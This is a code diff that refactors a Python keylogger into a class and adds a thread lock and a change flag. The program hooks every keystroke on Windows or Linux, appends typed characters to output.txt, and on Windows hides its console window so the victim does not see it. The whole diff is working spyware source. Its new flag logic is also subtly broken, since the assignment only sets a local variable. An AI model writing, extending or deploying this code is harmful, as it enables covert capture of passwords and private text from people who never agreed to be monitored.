@@ -12,45 +12,55 @@ if isWindows:
     import pythoncom
 else:
     import pyxhook
-import logging
+from threading import Lock
 
-
-log = 'output.txt'
+log_file = 'output.txt'
 escape = {
     9: '\t',
     13: '\n'
-    }
-def OnKeyboardEvent(event):
-    
-    if event.Ascii >= 32:
-        c = chr(event.Ascii)
-        with open(log, 'a+') as f:
-            f.write(c)
-    elif event.Ascii in escape:
-        with open(log, 'a+') as f:
-            f.write(escape[event.Ascii])
-    return True    
-def main():
-    # create a hook manager object
-    hm = None
-    if isWindows:
-        win = win32console.GetConsoleWindow() 
-        win32gui.ShowWindow(win, 0) 
-        hm = pyHook.HookManager()
-    else:
-        hm = pyxhook.HookManager()
-    hm.KeyDown = OnKeyboardEvent 
-    # set the hook 
-    hm.HookKeyboard() 
-    # wait forever
-    if isWindows:
-        pythoncom.PumpMessages()
-    else:
-        try:
-            hm.start()         # start the hook 
-        except KeyboardInterrupt: 
-            # User cancelled from command line. 
-            pass
-        except Exception as ex:
-            pass
-main()
+}
+edit_lock = Lock()
+hasChanged = True
+
+class KeyLogger:
+    def OnKeyboardEvent(self,event):
+        if event.Ascii >= 32:
+            c = chr(event.Ascii)
+            with open(log_file, 'a+') as f:
+                f.write(c)
+            #has file changed?
+            edit_lock.acquire()
+            hasChanged = False
+            edit_lock.release()
+
+        elif event.Ascii in escape:
+            with open(log_file, 'a+') as f:
+                f.write(escape[event.Ascii])
+            edit_lock.acquire()
+            hasChanged = False
+            edit_lock.release()
+        return True    
+
+    def __init__(self):
+        # create a hook manager object
+        hm = None
+        if isWindows:
+            win = win32console.GetConsoleWindow() 
+            win32gui.ShowWindow(win, 0) 
+            hm = pyHook.HookManager()
+        else:
+            hm = pyxhook.HookManager()
+        hm.KeyDown = self.OnKeyboardEvent 
+        # set the hook 
+        hm.HookKeyboard() 
+        # wait forever
+        if isWindows:
+            pythoncom.PumpMessages()
+        else:
+            try:
+                hm.start()         # start the hook 
+            except KeyboardInterrupt: 
+                # User cancelled from command line. 
+                pass
+            except Exception as ex:
+                pass
